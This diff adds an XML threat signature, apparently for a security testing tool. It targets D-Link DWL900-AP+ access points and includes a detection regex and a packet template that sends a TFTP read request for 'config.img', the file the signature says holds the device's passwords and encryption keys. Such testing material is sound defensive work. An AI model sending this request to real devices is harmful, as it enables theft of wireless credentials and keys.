@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="D-Link DWL900-AP+ Configuration Access"/>
+    <EngDesc display="true" value="This threat tries to grab the configuration file from a DWL900-AP+ access point. This file is accessible over TFTP and contains all the passwords and encryption keys that the AP uses.  TFTP typically uses port 69."/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="TFTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Wireless_AP"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="D-Link"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="D-Link_DWL900-AP+"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="2.1"/>
+      <item value="2.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="ETHEREANET-NCC Security Report EN-NCC-20021014-04"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="000001059814233500c000a80001003c58c03b57"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725882691250000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X00\X01\X63\X6F\X6E\X66\X69\X67\X2E\X69\X6D\X67\X00\X6F\X63\X74\X65\X74\X00"/>
+    <Created value="1139461969" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="TFTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$TFTPdestPort" checksum="" length="">
+          <TFTP_RRQ OpCode="0001" FilenameNullTerm="636F6E6669672E696D6700" ModeNullTerm="6F6374657400"/>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
